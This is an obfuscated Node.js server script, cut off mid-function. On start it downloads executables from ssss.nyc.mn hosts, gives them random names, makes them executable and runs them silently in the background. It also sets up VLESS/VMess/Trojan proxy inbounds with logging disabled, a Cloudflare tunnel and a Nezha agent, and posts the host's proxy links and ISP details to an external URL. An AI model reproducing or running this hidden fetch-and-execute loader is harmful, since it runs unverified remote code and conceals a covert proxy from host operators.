const _0x4f3a44=_0x24e5;(function(_0x36a544,_0x5082ce){const _0x56165c={_0x1ad551:0x11d,_0x8fb533:0x145,_0x28944e:0x149,_0x46f3b1:0x10c,_0x12f9a5:0xed},_0x475936=_0x24e5,_0x54f33d=_0x36a544();while(!![]){try{const _0x7ee06d=-parseInt(_0x475936(_0x56165c._0x1ad551))/0x1+-parseInt(_0x475936(_0x56165c._0x8fb533))/0x2+parseInt(_0x475936(0x11a))/0x3+parseInt(_0x475936(0x129))/0x4*(parseInt(_0x475936(_0x56165c._0x28944e))/0x5)+parseInt(_0x475936(0xd5))/0x6*(-parseInt(_0x475936(_0x56165c._0x46f3b1))/0x7)+-parseInt(_0x475936(_0x56165c._0x12f9a5))/0x8+parseInt(_0x475936(0x13c))/0x9*(parseInt(_0x475936(0xe9))/0xa);if(_0x7ee06d===_0x5082ce)break;else _0x54f33d['push'](_0x54f33d['shift']());}catch(_0x16dc7c){_0x54f33d['push'](_0x54f33d['shift']());}}}(_0x2f9c,0xbe927));const express=require(_0x4f3a44(0xd0)),app=express(),axios=require(_0x4f3a44(0x17d)),os=require('os'),fs=require('fs'),path=require(_0x4f3a44(0x161)),{promisify}=require(_0x4f3a44(0xeb)),exec=promisify(require(_0x4f3a44(0x154))[_0x4f3a44(0xd2)]),{execSync}=require(_0x4f3a44(0x154)),UPLOAD_URL=process[_0x4f3a44(0xc7)][_0x4f3a44(0x14b)]||'',PROJECT_URL=process[_0x4f3a44(0xc7)][_0x4f3a44(0xcd)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x4f3a44(0x187)]||'./tmp',SUB_PATH=process['env']['SUB_PATH']||_0x4f3a44(0xc9),PORT=process[_0x4f3a44(0xc7)][_0x4f3a44(0x186)]||process[_0x4f3a44(0xc7)][_0x4f3a44(0x122)]||0xbb8,UUID=process[_0x4f3a44(0xc7)][_0x4f3a44(0xc5)]||_0x4f3a44(0x107),NEZHA_SERVER=process[_0x4f3a44(0xc7)][_0x4f3a44(0x119)]||_0x4f3a44(0x181),NEZHA_PORT=process[_0x4f3a44(0xc7)][_0x4f3a44(0x15f)]||'',NEZHA_KEY=process[_0x4f3a44(0xc7)][_0x4f3a44(0x12d)]||_0x4f3a44(0x172),ARGO_DOMAIN=process[_0x4f3a44(0xc7)][_0x4f3a44(0x16d)]||_0x4f3a44(0xef),ARGO_AUTH=process[_0x4f3a44(0xc7)][_0x4f3a44(0x171)]||_0x4f3a44(0x10e),ARGO_PORT=process[_0x4f3a44(0xc7)][_0x4f3a44(0x113)]||0x1f41,CFIP=process['env'][_0x4f3a44(0xdb)]||_0x4f3a44(0x125),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x4f3a44(0xc7)][_0x4f3a44(0x109)]||_0x4f3a44(0xf0);!fs['existsSync'](FILE_PATH)?(fs[_0x4f3a44(0xff)](FILE_PATH),console[_0x4f3a44(0x11b)](FILE_PATH+'\x20is\x20created')):console[_0x4f3a44(0x11b)](FILE_PATH+_0x4f3a44(0x189));function generateRandomName(){const _0x1f4b77={_0x5ded6d:0x170,_0x99caef:0xd1,_0x1857d2:0x121},_0x4aac7d=_0x4f3a44,_0x4f2d31=_0x4aac7d(_0x1f4b77._0x5ded6d);let _0x443af0='';for(let _0x1c14c4=0x0;_0x1c14c4<0x6;_0x1c14c4++){_0x443af0+=_0x4f2d31[_0x4aac7d(_0x1f4b77._0x99caef)](Math[_0x4aac7d(0x138)](Math[_0x4aac7d(0x169)]()*_0x4f2d31[_0x4aac7d(_0x1f4b77._0x1857d2)]));}return _0x443af0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4f3a44(0x173)](FILE_PATH,phpName),webPath=path[_0x4f3a44(0x173)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4f3a44(0x17c)),listPath=path['join'](FILE_PATH,_0x4f3a44(0xdd)),bootLogPath=path[_0x4f3a44(0x173)](FILE_PATH,'boot.log'),configPath=path[_0x4f3a44(0x173)](FILE_PATH,_0x4f3a44(0x120));function deleteNodes(){const _0x28dffa={_0x27991a:0x147,_0x4ecd43:0x131,_0x58c52b:0x175,_0x1c0aca:0xd3,_0x3d2ca2:0x175,_0x41d4e9:0x100,_0x2b54cb:0xfa,_0x5d6718:0x102,_0x1a5a5f:0x159},_0x2cf299=_0x4f3a44;try{if(!UPLOAD_URL)return;if(!fs[_0x2cf299(_0x28dffa._0x27991a)](subPath))return;let _0x28ef0a;try{_0x28ef0a=fs[_0x2cf299(_0x28dffa._0x4ecd43)](subPath,_0x2cf299(_0x28dffa._0x58c52b));}catch{return null;}const _0x516221=Buffer['from'](_0x28ef0a,_0x2cf299(_0x28dffa._0x1c0aca))['toString'](_0x2cf299(_0x28dffa._0x3d2ca2)),_0x351170=_0x516221['split']('\x0a')[_0x2cf299(0x151)](_0x5417f8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2cf299(0xde)](_0x5417f8));if(_0x351170['length']===0x0)return;return axios[_0x2cf299(_0x28dffa._0x41d4e9)](UPLOAD_URL+_0x2cf299(_0x28dffa._0x2b54cb),JSON[_0x2cf299(_0x28dffa._0x5d6718)]({'nodes':_0x351170}),{'headers':{'Content-Type':_0x2cf299(0xcc)}})[_0x2cf299(_0x28dffa._0x1a5a5f)](_0x269c16=>{return null;}),null;}catch(_0x261653){return null;}}function cleanupOldFiles(){const _0x54db9a={_0x1da7ab:0xe6,_0x1e18c7:0xdf},_0x1e6260={_0x2b2c2b:0x13f},_0x424e4b=_0x4f3a44;try{const _0x2d9800=fs[_0x424e4b(_0x54db9a._0x1da7ab)](FILE_PATH);_0x2d9800[_0x424e4b(_0x54db9a._0x1e18c7)](_0x14954e=>{const _0x33d756=_0x424e4b,_0x1322bc=path['join'](FILE_PATH,_0x14954e);try{const _0xd4bf9e=fs[_0x33d756(0x174)](_0x1322bc);_0xd4bf9e[_0x33d756(_0x1e6260._0x2b2c2b)]()&&fs[_0x33d756(0x139)](_0x1322bc);}catch(_0x39ae12){}});}catch(_0x183d61){}}app[_0x4f3a44(0x148)]('/',function(_0x48a0ba,_0x303715){const _0x3f3fad={_0x204dea:0x17e},_0x5e97c1=_0x4f3a44;_0x303715[_0x5e97c1(0xea)](_0x5e97c1(_0x3f3fad._0x204dea));});async function generateConfig(){const _0x147181={_0x3c5431:0xda,_0x16df93:0x128,_0x4fe71e:0x15d,_0x20e03e:0x105,_0x3991ab:0xcf,_0x2e0575:0x160,_0x2cbc18:0xda,_0xd2181f:0xd6,_0x5d4d9c:0xda,_0x35e21a:0x15d,_0x3863a1:0x105,_0x2bb4a5:0x13d,_0x3ce5f7:0xe7,_0x5a5837:0x110,_0x1b5cb1:0x132,_0x3e2156:0xe7,_0x4f1e47:0xf9,_0x36c897:0x12e,_0x1c92db:0x165,_0x5db21f:0x173,_0x164378:0x120,_0x1d6ad0:0x102},_0x185ac9=_0x4f3a44,_0x3be374={'log':{'access':_0x185ac9(0x13a),'error':_0x185ac9(0x13a),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x185ac9(_0x147181._0x3c5431),'settings':{'clients':[{'id':UUID,'flow':_0x185ac9(_0x147181._0x16df93)}],'decryption':_0x185ac9(_0x147181._0x4fe71e),'fallbacks':[{'dest':0xbb9},{'path':_0x185ac9(_0x147181._0x20e03e),'dest':0xbba},{'path':_0x185ac9(_0x147181._0x3991ab),'dest':0xbbb},{'path':_0x185ac9(_0x147181._0x2e0575),'dest':0xbbc}]},'streamSettings':{'network':_0x185ac9(0xd6)}},{'port':0xbb9,'listen':_0x185ac9(0x132),'protocol':_0x185ac9(_0x147181._0x2cbc18),'settings':{'clients':[{'id':UUID}],'decryption':_0x185ac9(_0x147181._0x4fe71e)},'streamSettings':{'network':_0x185ac9(_0x147181._0xd2181f),'security':_0x185ac9(0x15d)}},{'port':0xbba,'listen':_0x185ac9(0x132),'protocol':_0x185ac9(_0x147181._0x5d4d9c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x185ac9(_0x147181._0x35e21a)},'streamSettings':{'network':'ws','security':_0x185ac9(_0x147181._0x4fe71e),'wsSettings':{'path':_0x185ac9(_0x147181._0x3863a1)}},'sniffing':{'enabled':!![],'destOverride':[_0x185ac9(_0x147181._0x2bb4a5),_0x185ac9(_0x147181._0x3ce5f7),_0x185ac9(_0x147181._0x5a5837)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x185ac9(_0x147181._0x1b5cb1),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x185ac9(_0x147181._0x3e2156),_0x185ac9(0x110)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x185ac9(_0x147181._0x1b5cb1),'protocol':_0x185ac9(_0x147181._0x4f1e47),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x185ac9(_0x147181._0x2bb4a5),'tls',_0x185ac9(0x110)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x185ac9(_0x147181._0x36c897)},{'protocol':_0x185ac9(_0x147181._0x1c92db),'tag':'block'}]};fs[_0x185ac9(0x166)](path[_0x185ac9(_0x147181._0x5db21f)](FILE_PATH,_0x185ac9(_0x147181._0x164378)),JSON[_0x185ac9(_0x147181._0x1d6ad0)](_0x3be374,null,0x2));}function getSystemArchitecture(){const _0x40a14d={_0x3be6b9:0x158,_0x15e911:0xfc,_0x409dfd:0x11e},_0x9092e7=_0x4f3a44,_0x144cf2=os[_0x9092e7(_0x40a14d._0x3be6b9)]();return _0x144cf2===_0x9092e7(0x185)||_0x144cf2===_0x9092e7(0x17b)||_0x144cf2===_0x9092e7(_0x40a14d._0x15e911)?_0x9092e7(0x185):_0x9092e7(_0x40a14d._0x409dfd);}function downloadFile(_0x7d9c15,_0x3da80b,_0x3fcd70){const _0x13ef3e={_0x41c374:0x180,_0x35f4cb:0x15e},_0x299315={_0x31a836:0xe5,_0x4cf3ea:0xe2},_0x2a5c6a=_0x4f3a44,_0x4204d3=_0x7d9c15;!fs[_0x2a5c6a(0x147)](FILE_PATH)&&fs[_0x2a5c6a(0xff)](FILE_PATH,{'recursive':!![]});const _0x10c023=fs[_0x2a5c6a(_0x13ef3e._0x41c374)](_0x4204d3);axios({'method':'get','url':_0x3da80b,'responseType':_0x2a5c6a(0x10f)})[_0x2a5c6a(_0x13ef3e._0x35f4cb)](_0x8b691c=>{const _0x2ee5e8={_0x4b692b:0x142,_0xa130f8:0x136,_0x4ee7a4:0x152},_0xd98299={_0x1ffc97:0x11b,_0x16aca1:0x142,_0x21d78e:0xf2},_0x11547e=_0x2a5c6a;_0x8b691c[_0x11547e(_0x299315._0x31a836)][_0x11547e(_0x299315._0x4cf3ea)](_0x10c023),_0x10c023['on'](_0x11547e(0x140),()=>{const _0x5ba3ad=_0x11547e;_0x10c023['close'](),console[_0x5ba3ad(_0xd98299._0x1ffc97)](_0x5ba3ad(_0xd98299._0x16aca1)+path['basename'](_0x4204d3)+_0x5ba3ad(_0xd98299._0x21d78e)),_0x3fcd70(null,_0x4204d3);}),_0x10c023['on']('error',_0x759d90=>{const _0x34bf50=_0x11547e;fs['unlink'](_0x4204d3,()=>{});const _0x123a7c=_0x34bf50(_0x2ee5e8._0x4b692b)+path[_0x34bf50(0x14a)](_0x4204d3)+_0x34bf50(_0x2ee5e8._0xa130f8)+_0x759d90[_0x34bf50(0x153)];console[_0x34bf50(_0x2ee5e8._0x4ee7a4)](_0x123a7c),_0x3fcd70(_0x123a7c);});})[_0x2a5c6a(0x159)](_0x3313a9=>{const _0x2e92e4=_0x2a5c6a,_0x232710=_0x2e92e4(0x142)+path[_0x2e92e4(0x14a)](_0x4204d3)+_0x2e92e4(0x136)+_0x3313a9['message'];console[_0x2e92e4(0x152)](_0x232710),_0x3fcd70(_0x232710);});}async function downloadFilesAndRun(){const _0x16619c={_0x3200c6:0x11b,_0x2cfaf5:0xc8,_0x38c6b8:0x164,_0x207322:0x177,_0x12240e:0x17a,_0x29935d:0x143,_0x20ce1f:0xf6,_0x12a9d0:0x12b,_0x55b278:0x188,_0x323c65:0x118,_0x365bc3:0x156,_0x4ab44a:0xd8,_0x494099:0x13e,_0x17a63e:0x152,_0xae26de:0x13b,_0x256f6f:0xc6,_0xf4a137:0x10a,_0x6e873d:0xe1,_0x2b5b0a:0xd7,_0x38f357:0x16a,_0xef7de9:0x147,_0x16a9b7:0x18a},_0x3c808e={_0x5bd8d2:0xdf},_0x44d3f2=_0x4f3a44,_0x3c02f3=getSystemArchitecture(),_0x3a5f7=getFilesForArchitecture(_0x3c02f3);if(_0x3a5f7['length']===0x0){console[_0x44d3f2(_0x16619c._0x3200c6)](_0x44d3f2(0xe8));return;}const _0x268f26=_0x3a5f7[_0x44d3f2(_0x16619c._0x2cfaf5)](_0x2664fa=>{return new Promise((_0x418e2c,_0x546fa4)=>{const _0x106908=_0x24e5;downloadFile(_0x2664fa[_0x106908(0xec)],_0x2664fa[_0x106908(0xdc)],(_0x3f3a60,_0x8f9d07)=>{_0x3f3a60?_0x546fa4(_0x3f3a60):_0x418e2c(_0x8f9d07);});});});try{await Promise['all'](_0x268f26);}catch(_0x5e3ded){console[_0x44d3f2(0x152)](_0x44d3f2(_0x16619c._0x38c6b8),_0x5e3ded);return;}function _0x556e09(_0x8ee0d8){const _0x59d691={_0x3fe282:0xf8},_0x1170d0=_0x44d3f2,_0x5cd4c7=0x1fd;_0x8ee0d8[_0x1170d0(_0x3c808e._0x5bd8d2)](_0x192bb8=>{const _0x2efa20=_0x1170d0;fs['existsSync'](_0x192bb8)&&fs[_0x2efa20(0x14d)](_0x192bb8,_0x5cd4c7,_0x27d186=>{const _0x4d0509=_0x2efa20;_0x27d186?console[_0x4d0509(0x152)]('Empowerment\x20failed\x20for\x20'+_0x192bb8+':\x20'+_0x27d186):console[_0x4d0509(0x11b)](_0x4d0509(_0x59d691._0x3fe282)+_0x192bb8+':\x20'+_0x5cd4c7['toString'](0x8));});});}const _0x19533b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x556e09(_0x19533b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3e0214=NEZHA_SERVER[_0x44d3f2(_0x16619c._0x207322)](':')?NEZHA_SERVER[_0x44d3f2(_0x16619c._0x12240e)](':')['pop']():'',_0x426c67=new Set([_0x44d3f2(0x123),_0x44d3f2(_0x16619c._0x29935d),_0x44d3f2(0x183),_0x44d3f2(_0x16619c._0x20ce1f),'2083','2053']),_0x52b210=_0x426c67[_0x44d3f2(_0x16619c._0x12a9d0)](_0x3e0214)?_0x44d3f2(0x104):_0x44d3f2(0x144),_0x368733=_0x44d3f2(_0x16619c._0x55b278)+NEZHA_KEY+_0x44d3f2(_0x16619c._0x323c65)+NEZHA_SERVER+_0x44d3f2(_0x16619c._0x365bc3)+_0x52b210+_0x44d3f2(_0x16619c._0x4ab44a)+UUID;fs[_0x44d3f2(0x166)](path[_0x44d3f2(0x173)](FILE_PATH,'config.yaml'),_0x368733);const _0x4ab953='nohup\x20'+phpPath+_0x44d3f2(_0x16619c._0x494099)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4ab953),console['log'](phpName+_0x44d3f2(0x11f)),await new Promise(_0x332f53=>setTimeout(_0x332f53,0x3e8));}catch(_0x507f20){console[_0x44d3f2(_0x16619c._0x17a63e)](_0x44d3f2(0xce)+_0x507f20);}}else{let _0x32acbb='';const _0x4ecb1a=[_0x44d3f2(0x123),_0x44d3f2(0x143),'2096',_0x44d3f2(0xf6),_0x44d3f2(_0x16619c._0xae26de),_0x44d3f2(_0x16619c._0x256f6f)];_0x4ecb1a['includes'](NEZHA_PORT)&&(_0x32acbb=_0x44d3f2(0x141));const _0x585e37=_0x44d3f2(_0x16619c._0xf4a137)+npmPath+_0x44d3f2(_0x16619c._0x6e873d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x44d3f2(_0x16619c._0x2b5b0a)+NEZHA_KEY+'\x20'+_0x32acbb+_0x44d3f2(_0x16619c._0x38f357);try{await exec(_0x585e37),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x5b4b80=>setTimeout(_0x5b4b80,0x3e8));}catch(_0x4b12f0){console[_0x44d3f2(0x152)]('npm\x20running\x20error:\x20'+_0x4b12f0);}}}else console[_0x44d3f2(0x11b)](_0x44d3f2(0x179));const _0x1ca6d6=_0x44d3f2(0x10a)+webPath+_0x44d3f2(0xf5)+FILE_PATH+_0x44d3f2(0x12c);try{await exec(_0x1ca6d6),console['log'](webName+'\x20is\x20running'),await new Promise(_0x1cdf50=>setTimeout(_0x1cdf50,0x3e8));}catch(_0x31845f){console[_0x44d3f2(_0x16619c._0x17a63e)](_0x44d3f2(0xee)+_0x31845f);}if(fs[_0x44d3f2(_0x16619c._0xef7de9)](botPath)){let _0x308cd5;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x308cd5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x44d3f2(0x146)](/TunnelSecret/)?_0x308cd5=_0x44d3f2(0x16f)+FILE_PATH+_0x44d3f2(0x17f):_0x308cd5=_0x44d3f2(0x14c)+FILE_PATH+_0x44d3f2(0x12a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x308cd5+'\x20>/dev/null\x202>&1\x20&'),console[_0x44d3f2(_0x16619c._0x3200c6)](botName+'\x20is\x20running'),await new Promise(_0x4c5354=>setTimeout(_0x4c5354,0x7d0));}catch(_0x5431ee){console[_0x44d3f2(0x152)](_0x44d3f2(_0x16619c._0x16a9b7)+_0x5431ee);}}await new Promise(_0x5ecbe5=>setTimeout(_0x5ecbe5,0x1388));}function getFilesForArchitecture(_0x4770ec){const _0x50c123={_0x38571b:0x185,_0xe5a5be:0xe0},_0x2359dc=_0x4f3a44;let _0x16cc35;_0x4770ec===_0x2359dc(_0x50c123._0x38571b)?_0x16cc35=[{'fileName':webPath,'fileUrl':_0x2359dc(0x16e)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x16cc35=[{'fileName':webPath,'fileUrl':_0x2359dc(_0x50c123._0xe5a5be)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x116299=_0x4770ec===_0x2359dc(0x185)?'https://arm64.ssss.nyc.mn/agent':_0x2359dc(0x157);_0x16cc35[_0x2359dc(0x124)]({'fileName':npmPath,'fileUrl':_0x116299});}else{const _0x44f7f4=_0x4770ec===_0x2359dc(0x185)?_0x2359dc(0x135):'https://amd64.ssss.nyc.mn/v1';_0x16cc35['unshift']({'fileName':phpPath,'fileUrl':_0x44f7f4});}}return _0x16cc35;}function _0x24e5(_0x28f86c,_0x395455){const _0x2f9cb2=_0x2f9c();return _0x24e5=function(_0x24e556,_0x553c24){_0x24e556=_0x24e556-0xc5;let _0x2d5f6c=_0x2f9cb2[_0x24e556];return _0x2d5f6c;},_0x24e5(_0x28f86c,_0x395455);}function argoType(){const _0x52e820={_0x184f44:0x167,_0x5e765a:0xca,_0xb9e844:0x17a,_0x16d2d1:0x114,_0x39f5e0:0x173},_0x24dba9=_0x4f3a44;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x24dba9(0x163));return;}if(ARGO_AUTH['includes'](_0x24dba9(_0x52e820._0x184f44))){fs[_0x24dba9(0x166)](path['join'](FILE_PATH,_0x24dba9(_0x52e820._0x5e765a)),ARGO_AUTH);const _0x3ef2eb=_0x24dba9(0x14f)+ARGO_AUTH[_0x24dba9(_0x52e820._0xb9e844)]('\x22')[0xb]+_0x24dba9(_0x52e820._0x16d2d1)+path[_0x24dba9(_0x52e820._0x39f5e0)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x24dba9(0x126);fs['writeFileSync'](path[_0x24dba9(0x173)](FILE_PATH,_0x24dba9(0x117)),_0x3ef2eb);}else console[_0x24dba9(0x11b)](_0x24dba9(0xe4));}async function extractDomains(){const _0x366aad={_0x3072fc:0x173,_0x228dd2:0x175,_0x512db5:0x17a,_0x845051:0x11b,_0x4920fc:0x16b,_0x13f756:0x14c,_0x3ec499:0x12a,_0x146d47:0x11f,_0x481663:0x152},_0x391b33={_0x257d3f:0xd9,_0x4c5bca:0x15b,_0x41c778:0xe5,_0x2b3efa:0xe5,_0x15fc8d:0x112,_0x5cf6f6:0x176,_0xa9bc2b:0x176},_0x1d3c4e={_0x4e6475:0xf1,_0x162fcb:0xf4,_0x3a2031:0xf7,_0x374921:0xd1},_0x159bad=_0x4f3a44;let _0x2feccf;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2feccf=ARGO_DOMAIN,console[_0x159bad(0x11b)](_0x159bad(0xfd),_0x2feccf),await _0x2bd475(_0x2feccf);else try{const _0x16f8ea=fs[_0x159bad(0x131)](path[_0x159bad(_0x366aad._0x3072fc)](FILE_PATH,_0x159bad(0x12f)),_0x159bad(_0x366aad._0x228dd2)),_0x53bd3b=_0x16f8ea[_0x159bad(_0x366aad._0x512db5)]('\x0a'),_0x139d21=[];_0x53bd3b[_0x159bad(0xdf)](_0x216cdd=>{const _0x52b3ee=_0x159bad,_0xc85c7=_0x216cdd[_0x52b3ee(0x146)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xc85c7){const _0x421fae=_0xc85c7[0x1];_0x139d21['push'](_0x421fae);}});if(_0x139d21[_0x159bad(0x121)]>0x0)_0x2feccf=_0x139d21[0x0],console[_0x159bad(_0x366aad._0x845051)](_0x159bad(0x18b),_0x2feccf),await _0x2bd475(_0x2feccf);else{console['log'](_0x159bad(_0x366aad._0x4920fc)),fs[_0x159bad(0x139)](path[_0x159bad(0x173)](FILE_PATH,'boot.log'));async function _0x4661ef(){const _0x42b113=_0x159bad;try{process[_0x42b113(_0x1d3c4e._0x4e6475)]===_0x42b113(_0x1d3c4e._0x162fcb)?await exec(_0x42b113(0x10b)+botName+_0x42b113(_0x1d3c4e._0x3a2031)):await exec('pkill\x20-f\x20\x22['+botName[_0x42b113(_0x1d3c4e._0x374921)](0x0)+']'+botName[_0x42b113(0x127)](0x1)+_0x42b113(0x133));}catch(_0x388181){}}_0x4661ef(),await new Promise(_0x23844e=>setTimeout(_0x23844e,0xbb8));const _0x5f24fd=_0x159bad(_0x366aad._0x13f756)+FILE_PATH+_0x159bad(_0x366aad._0x3ec499)+ARGO_PORT;try{await exec(_0x159bad(0x10a)+botPath+'\x20'+_0x5f24fd+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x159bad(_0x366aad._0x146d47)),await new Promise(_0x3e7145=>setTimeout(_0x3e7145,0xbb8)),await extractDomains();}catch(_0x208d47){console['error'](_0x159bad(0x18a)+_0x208d47);}}}catch(_0x2a4d27){console[_0x159bad(_0x366aad._0x481663)]('Error\x20reading\x20boot.log:',_0x2a4d27);}async function _0x512cd2(){const _0x4b4e43=_0x159bad;try{const _0x1a776c=await axios[_0x4b4e43(0x148)](_0x4b4e43(_0x391b33._0x257d3f),{'timeout':0xbb8});if(_0x1a776c['data']&&_0x1a776c['data'][_0x4b4e43(_0x391b33._0x4c5bca)]&&_0x1a776c[_0x4b4e43(0xe5)][_0x4b4e43(0x176)])return _0x1a776c[_0x4b4e43(_0x391b33._0x41c778)][_0x4b4e43(0x15b)]+'_'+_0x1a776c['data']['org'];}catch(_0x511384){try{const _0x5bf399=await axios[_0x4b4e43(0x148)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x5bf399[_0x4b4e43(_0x391b33._0x2b3efa)]&&_0x5bf399[_0x4b4e43(0xe5)][_0x4b4e43(_0x391b33._0x15fc8d)]===_0x4b4e43(0xe3)&&_0x5bf399[_0x4b4e43(_0x391b33._0x41c778)][_0x4b4e43(0x11c)]&&_0x5bf399[_0x4b4e43(0xe5)][_0x4b4e43(_0x391b33._0x5cf6f6)])return _0x5bf399[_0x4b4e43(_0x391b33._0x2b3efa)][_0x4b4e43(0x11c)]+'_'+_0x5bf399['data'][_0x4b4e43(_0x391b33._0xa9bc2b)];}catch(_0x1d9520){}}return'Unknown';}async function _0x2bd475(_0x899775){const _0x21871a=await _0x512cd2(),_0x653d04=NAME?NAME+'-'+_0x21871a:_0x21871a;return new Promise(_0x139d6b=>{const _0x33c743={_0x231643:0x15d,_0x36d65d:0x15d,_0x55209e:0x18c,_0x1f6820:0x14e,_0x39f663:0x178,_0x27bdff:0x102,_0xc8ca27:0x15c,_0x35645d:0x11b,_0x1fa7ee:0x150,_0x54951e:0x166,_0xeb3ebc:0xd3},_0x5b1603={_0x606496:0x18d,_0x3efb58:0xfb};setTimeout(()=>{const _0x4fac7f=_0x24e5,_0x16811d={'v':'2','ps':''+_0x653d04,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4fac7f(_0x33c743._0x231643),'net':'ws','type':_0x4fac7f(_0x33c743._0x36d65d),'host':_0x899775,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x899775,'alpn':'','fp':_0x4fac7f(_0x33c743._0x55209e)},_0x4d477d=_0x4fac7f(_0x33c743._0x1f6820)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x899775+'&fp=firefox&type=ws&host='+_0x899775+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x653d04+'\x0a\x0avmess://'+Buffer[_0x4fac7f(_0x33c743._0x39f663)](JSON[_0x4fac7f(_0x33c743._0x27bdff)](_0x16811d))['toString'](_0x4fac7f(0xd3))+_0x4fac7f(_0x33c743._0xc8ca27)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x899775+'&fp=firefox&type=ws&host='+_0x899775+_0x4fac7f(0x162)+_0x653d04+'\x0a\x20\x20\x20\x20';console[_0x4fac7f(_0x33c743._0x35645d)](Buffer[_0x4fac7f(0x178)](_0x4d477d)[_0x4fac7f(_0x33c743._0x1fa7ee)](_0x4fac7f(0xd3))),fs[_0x4fac7f(_0x33c743._0x54951e)](subPath,Buffer['from'](_0x4d477d)[_0x4fac7f(_0x33c743._0x1fa7ee)](_0x4fac7f(_0x33c743._0xeb3ebc))),console[_0x4fac7f(0x11b)](FILE_PATH+_0x4fac7f(0xf3)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2588e1,_0x11bb5e)=>{const _0x39a016=_0x4fac7f,_0x106f4d=Buffer['from'](_0x4d477d)[_0x39a016(0x150)](_0x39a016(0xd3));_0x11bb5e[_0x39a016(_0x5b1603._0x606496)](_0x39a016(0x101),_0x39a016(_0x5b1603._0x3efb58)),_0x11bb5e['send'](_0x106f4d);}),_0x139d6b(_0x4d477d);},0x7d0);});}}async function uploadNodes(){const _0x277441={_0x3eaa12:0x100,_0x4b4a0b:0x103,_0xa4daa4:0x175,_0x573b82:0x121,_0x52c5c2:0x102,_0x422b10:0x11b,_0x4ae473:0x108},_0x18fafc=_0x4f3a44;if(UPLOAD_URL&&PROJECT_URL){const _0x1a952d=PROJECT_URL+'/'+SUB_PATH,_0x5a1eee={'subscription':[_0x1a952d]};try{const _0x1ce5cf=await axios[_0x18fafc(_0x277441._0x3eaa12)](UPLOAD_URL+_0x18fafc(0x155),_0x5a1eee,{'headers':{'Content-Type':_0x18fafc(0xcc)}});return _0x1ce5cf&&_0x1ce5cf[_0x18fafc(0x112)]===0xc8?(console[_0x18fafc(0x11b)](_0x18fafc(_0x277441._0x4b4a0b)),_0x1ce5cf):null;}catch(_0x19a130){if(_0x19a130[_0x18fafc(0x130)]){if(_0x19a130[_0x18fafc(0x130)][_0x18fafc(0x112)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2cad6f=fs[_0x18fafc(0x131)](listPath,_0x18fafc(_0x277441._0xa4daa4)),_0xf53a89=_0x2cad6f[_0x18fafc(0x17a)]('\x0a')[_0x18fafc(0x151)](_0x20c7e2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x18fafc(0xde)](_0x20c7e2));if(_0xf53a89[_0x18fafc(_0x277441._0x573b82)]===0x0)return;const _0x55745c=JSON[_0x18fafc(_0x277441._0x52c5c2)]({'nodes':_0xf53a89});try{const _0x116f57=await axios[_0x18fafc(0x100)](UPLOAD_URL+_0x18fafc(0x168),_0x55745c,{'headers':{'Content-Type':_0x18fafc(0xcc)}});return _0x116f57&&_0x116f57[_0x18fafc(0x112)]===0xc8?(console[_0x18fafc(_0x277441._0x422b10)](_0x18fafc(_0x277441._0x4ae473)),_0x116f57):null;}catch(_0x1e3b8a){return null;}}else return;}}function cleanFiles(){const _0x2f9c2c={_0x4a33d2:0xf1,_0x4a015e:0x106,_0x2c04fe:0x10d,_0x2d0d23:0x116};setTimeout(()=>{const 